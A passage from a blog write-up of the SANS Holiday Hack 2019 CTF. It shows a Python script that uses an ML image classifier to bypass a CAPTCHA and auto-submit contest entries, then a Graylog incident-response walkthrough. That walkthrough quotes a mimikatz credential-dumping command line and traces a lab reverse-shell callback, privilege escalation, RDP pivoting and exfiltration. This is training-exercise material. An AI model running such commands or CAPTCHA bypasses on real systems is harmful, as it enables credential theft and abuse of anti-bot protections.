    &lt;span class="n"&gt;challenge_image_types&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;challenge_image_type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;challenge_image_type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;challenge_image_type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt; &lt;span class="c1"&gt;# cleaning and formatting&lt;/span&gt;

    &lt;span class="n"&gt;uuid_results&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# Categorizing images&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;b64_image&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;b64_images&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;img_category&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;categorize_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image_from_b64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;img_category&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;challenge_image_types&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;uuid_results&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="c1"&gt;# This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .&lt;/span&gt;
    &lt;span class="n"&gt;final_answer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uuid_results&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# [...] the rest of the file is the same as Krampus&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we have everything we need: we load our model, get the different
images, categorize them using our model, and select only the images in
categories asked by the CAPTEHA. Let's launch our script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./capteha_api.py
&lt;span class="go"&gt;INFO: Initialized TensorFlow Lite runtime.&lt;/span&gt;
&lt;span class="go"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;./capteha_api.py&amp;quot;, line 109, in &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    main()&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;./capteha_api.py&amp;quot;, line 73, in main&lt;/span&gt;
&lt;span class="go"&gt;    img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;./capteha_api.py&amp;quot;, line 41, in categorize_image&lt;/span&gt;
&lt;span class="go"&gt;    interpreter.set_tensor(input_details[0][&amp;#39;index&amp;#39;], input_data)&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter.py&amp;quot;, line 346, in set_tensor&lt;/span&gt;
&lt;span class="go"&gt;    self._interpreter.SetTensor(tensor_index, value)&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter_wrapper/tensorflow_wrap_interpreter_wrapper.py&amp;quot;, line 136, in SetTensor&lt;/span&gt;
&lt;span class="go"&gt;    return _tensorflow_wrap_interpreter_wrapper.InterpreterWrapper_SetTensor(self, i, value)&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;ValueError: Cannot set tensor: Dimension mismatch. Got 112 but expected 224 for dimension 1 of input 175.&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get an error... The message says that there's a dimension mismatch, and that
our script expected a dimension of 224. If we take a look at Krampus' image
catalogue, we can see that every image has a size of 224 x 224 pixels. If we
give an image that does not have the same size, it can't use our model to try
and categorize it. So, let's modify our code to resize every CAPTEHA image to
be 224 x 224:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;image_from_b64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;img_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BytesIO&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img_data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;resize&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;224&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;224&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;img&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, let's relaunch our script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./capteha_api.py
&lt;span class="go"&gt;INFO: Initialized TensorFlow Lite runtime.&lt;/span&gt;
&lt;span class="go"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;./capteha_api.py&amp;quot;, line 110, in &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    main()&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;./capteha_api.py&amp;quot;, line 74, in main&lt;/span&gt;
&lt;span class="go"&gt;    img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;./capteha_api.py&amp;quot;, line 42, in categorize_image&lt;/span&gt;
&lt;span class="go"&gt;    interpreter.set_tensor(input_details[0][&amp;#39;index&amp;#39;], input_data)&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter.py&amp;quot;, line 346, in set_tensor&lt;/span&gt;
&lt;span class="go"&gt;    self._interpreter.SetTensor(tensor_index, value)&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter_wrapper/tensorflow_wrap_interpreter_wrapper.py&amp;quot;, line 136, in SetTensor&lt;/span&gt;
&lt;span class="go"&gt;    return _tensorflow_wrap_interpreter_wrapper.InterpreterWrapper_SetTensor(self, i, value)&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;ValueError: Cannot set tensor: Dimension mismatch. Got 4 but expected 3 for dimension 3 of input 175.&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, still this dimension mismatch error message. However, the first one talked
about &amp;quot;dimension 1&amp;quot;. This one talks about &amp;quot;dimension 3&amp;quot;. We're talking about
images: dimension 1 must be the height, dimension 2 the witdh. What can
dimension 3 be? Since we're manipulating &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Portable_Network_Graphics"&gt;PNG images&lt;/a&gt;,
there's an &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Alpha_compositing"&gt;alpha channel&lt;/a&gt;,
used to encode the transparency of the background.&lt;/p&gt;
&lt;p&gt;I decided to remove the transparent background from the image. I used &lt;a class="reference external" href="https://stackoverflow.com/a/9459208"&gt;this
StackOverflow's answer&lt;/a&gt; to see how to
do it using &lt;a class="reference external" href="https://www.pythonware.com/products/pil/"&gt;PIL&lt;/a&gt;. Here's our new
code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;image_from_b64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;img_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;first_img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BytesIO&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img_data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;first_img&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;paste&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;first_img&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;first_img&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/span&gt;    &lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;resize&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;224&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;224&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;img&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, this means that our CAPTEHA images do not have a transparent background
anymore, whereas the catalogue images we used to train our model did. This
might make our Machine Learning model a little bit unreliable. We could modify
our catalogue images to remove the alpha channel, and retrain our model. I
opted to try with my initial model, because I was to impatient to train another
model.&lt;/p&gt;
&lt;p&gt;Sure enough, my model was not the most precise, and I had to try a couple of
times. But after four or five tries, my script correctly solved the CAPTEHA:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./capteha_api.py
&lt;span class="go"&gt;INFO: Initialized TensorFlow Lite runtime.&lt;/span&gt;
&lt;span class="go"&gt;CAPTEHA Solved!&lt;/span&gt;
&lt;span class="go"&gt;Submitting lots of entries until we win the contest! Entry #1&lt;/span&gt;
&lt;span class="go"&gt;Submitting lots of entries until we win the contest! Entry #2&lt;/span&gt;
&lt;span class="go"&gt;Submitting lots of entries until we win the contest! Entry #3&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;Submitting lots of entries until we win the contest! Entry #103&lt;/span&gt;
&lt;span class="go"&gt;Submitting lots of entries until we win the contest! Entry #104&lt;/span&gt;
&lt;span class="go"&gt;{&amp;quot;data&amp;quot;:&amp;quot;&amp;lt;h2 id=\&amp;quot;result_header\&amp;quot;&amp;gt; Entries for email address [REDACTED] no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; Congratulations and Happy Holidays!&amp;lt;/h2&amp;gt;&amp;quot;,&amp;quot;request&amp;quot;:true}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Few seconds later, I receive an email:&lt;/p&gt;
&lt;img alt="frido_sleigh_mail.png" class="align-center" src="/images/sans-christmas-challenge-2019/frido_sleigh_mail.png" /&gt;
&lt;p&gt;We managed to win the contest for Krampus!&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-9"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id31"&gt;Objective 9:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="pepper-minstix-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id32"&gt;Pepper Minstix's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We must take a look at logs in Graylog to find weird events and answer
questions.&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Minty CandyCane reported some weird activity on his computer after he
clicked on a link in Firefox for a cookie recipe and downloaded a file. What
is the full-path + filename of the first malicious file downloaded by Minty?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let's search events with &lt;code&gt;UserAccount:minty&lt;/code&gt;. Luckily, one of the &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=UserAccount%3Aminty"&gt;first
results&lt;/a&gt;
looks like a malicious file, &lt;code&gt;C:\Users\minty\Downloads\cookie_recipe.exe&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;The malicious file downloaded and executed by Minty gave the attacker remote
access to his machine. What was the &lt;strong&gt;ip:port&lt;/strong&gt; the malicious file connected
to first?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, we can look for &lt;code&gt;cookie_recipe.exe&lt;/code&gt; and events with a
&lt;code&gt;DestinationIp&lt;/code&gt; attribute. &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=cookie_recipe.exe%20AND%20UserAccount%3Aminty%20AND%20_exists_%3ADestinationIp"&gt;This query&lt;/a&gt;
has only one result. The &lt;code&gt;ip:port&lt;/code&gt; is &lt;code&gt;192.168.247.175:4444&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;What was the first command executed by the attacker?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If we keep looking for &lt;code&gt;cookie_recipe.exe&lt;/code&gt;, we can &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=cookie_recipe.exe"&gt;see&lt;/a&gt; the commands launched by the
attacker. The first one is &lt;code&gt;whoami&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;What is the one-word service name the attacker used to escalate privileges?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Still looking at &lt;code&gt;cookie_recipe.exe&lt;/code&gt;, we see the interaction with a
Windows service with the &lt;code&gt;sc&lt;/code&gt; command. The service is called
&lt;code&gt;webexservice&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;What is the file-path + filename of the binary ran by the attacker to dump credentials?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If we take a look at the &lt;code&gt;webexservice&lt;/code&gt; service, we can
&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=webexservice"&gt;see&lt;/a&gt;
the creation of another executable, &lt;code&gt;cookie_recipe2.exe&lt;/code&gt;. Let's look for
this executable. The
&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=cookie_recipe2.exe"&gt;results&lt;/a&gt;
show that the attacker downloaded &lt;code&gt;mimikatz&lt;/code&gt; from &lt;a class="reference external" href="https://github.com/gentilkiwi"&gt;gentilkiwi's GitHub
repository&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's look for &lt;code&gt;mimikatz&lt;/code&gt;. The
&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=mimikatz"&gt;results&lt;/a&gt;
show that a command line &lt;code&gt;&amp;quot;C:\cookie.exe&amp;quot; privilege::debug sekurlsa::logonpasswords exit&lt;/code&gt;
was launched. The &lt;code&gt;mimikatz&lt;/code&gt; executable was therefore saved under
&lt;code&gt;C:\cookie.exe&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;The attacker pivoted to another workstation using credentials gained from
Minty's computer. Which account name was used to pivot to another machine?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, we know the attacker's IP is &lt;code&gt;192.168.247.175&lt;/code&gt;. We also know from
the analysis of the password spraying attack, that the Event ID for a correct
authentication is 4624. Let's look for this Event ID, tied to this IP address.
The
&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=source%2CCommandLine%2CLogonType%2Cmessage&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=EventID%3A4624%20AND%20192.168.247.175"&gt;results&lt;/a&gt;
all have the same &lt;code&gt;AccountName&lt;/code&gt; attribute, &lt;code&gt;alabaster&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection
to another machine?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, I had a hard time answering this one. I &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=DestinationPort%3A3389"&gt;looked for events&lt;/a&gt;
with &lt;code&gt;DestinationPort:3389&lt;/code&gt;, and submitted the four different timestamps.
However, they were not the correct one. I thought that maybe I should submit
them with their UTC value, but to no avail.&lt;/p&gt;
&lt;p&gt;I then tried bruteforcing every value between &lt;code&gt;05:59:00&lt;/code&gt; and
&lt;code&gt;06:02:00&lt;/code&gt;, but it was also a fail.&lt;/p&gt;
&lt;p&gt;Finally, I manually tried every timestamp for the query &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=EventID%3A4624%20AND%20DestinationHostname%3Aelfu%5C-res%5C-wks2"&gt;EventID:4624 AND
DestinationHostname:&amp;quot;elfu-res-wks2&amp;quot;&lt;/a&gt;
after &lt;code&gt;05:59:00&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Turns out the correct one is &lt;code&gt;06:04:28&lt;/code&gt;. After inputing the correct
answer, the report tells you:&lt;/p&gt;
&lt;blockquote&gt;
LogonType 10 is used for successful network connections using the RDP
client.&lt;/blockquote&gt;
&lt;p&gt;So, I guess I should have looked for &lt;code&gt;LogonType:10&lt;/code&gt;, which indicates that
the connection is fully complete, whereas my first four timestamps were just
the establishment of the TCP connection.&lt;/p&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;The attacker navigates the file system of a third host using their Remote
Desktop Connection to the second host. What is the &lt;strong&gt;SourceHostName,DestinationHostname,LogonType&lt;/strong&gt;
of this connection?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, we know that the second host is &lt;code&gt;elfu-res-wks2&lt;/code&gt;. If we keep looking
for Event ID 4624 with this &lt;code&gt;SourceHostName&lt;/code&gt;, we
&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=SourceHostName%3A%22ELFU-RES-WKS2%22%20AND%20EventID%3A4624"&gt;find&lt;/a&gt;
two values for &lt;code&gt;DestinationHostname&lt;/code&gt;: &lt;code&gt;elfu-res-wks2&lt;/code&gt; (our
original workstation) or &lt;code&gt;elfu-res-wks3&lt;/code&gt;. The latter must be our third
host.&lt;/p&gt;
&lt;p&gt;Let's add &lt;code&gt;DestinationHostname=&amp;quot;elfu-res-wks3&amp;quot;&lt;/code&gt; to our previous query to
see the possible value for &lt;code&gt;LogonType&lt;/code&gt;. We
&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=SourceHostName%3A%22ELFU-RES-WKS2%22%20AND%20EventID%3A4624%20AND%20DestinationHostname%3A%22elfu-res-wks3%22"&gt;find&lt;/a&gt;
that the onlye &lt;code&gt;LogonType&lt;/code&gt; is &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Therefore, the CSV result is &lt;code&gt;elfu-res-wks2,elfu-res-wks3,3&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;What is the full-path + filename of the secret research document after being
transferred from the third host to the second host?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, we can specify a &lt;code&gt;source=&amp;quot;elfu-res-wks2&amp;quot;&lt;/code&gt; and look for file
creation. &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=source%3D%22elfu-res-wks2%22%20AND%20_exists_%3ATargetFilename"&gt;This query&lt;/a&gt;
returns a few results. By looking through it, we can find the file
&lt;code&gt;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;What is the IPv4 address (as found in logs) the secret research document
was exfiltrated to?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If we &lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=super_secret_elfu_research.pdf"&gt;look for this file name&lt;/a&gt;,
we can see that the file was exfiltraded to pastebin.com, via a PowerShell
command, with a PID of 1232. Let's look for this PID, and list the different
&lt;code&gt;DestinationIp&lt;/code&gt; it communicated with.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;amp;fields=message%2Csource&amp;amp;width=1853&amp;amp;highlightMessage=&amp;amp;relative=0&amp;amp;q=ProcessId%3A1232%20AND%20_exists_%3ADestinationIp"&gt;This query&lt;/a&gt;
gives us only one IP address: &lt;code&gt;104.22.3.84&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now that we have answered every question, we get the following message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Incident Response Report #7830984301576234 Submitted.&lt;/p&gt;
&lt;p&gt;Incident Fully Detected!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div class="section" id="retrieve-scraps-of-paper-from-server"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id33"&gt;Retrieve Scraps of Paper from Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Krampus is super happy that we managed to win the Frido Sleigh contest for him!&lt;/p&gt;
&lt;img alt="krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" /&gt;
&lt;p&gt;&lt;em&gt;Krampus says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You did it! Thank you so much. I can trust you!&lt;/p&gt;
&lt;p&gt;To help you, I have flashed the firmware in your badge to unlock a useful
new feature: magical teleportation through the steam tunnels.&lt;/p&gt;
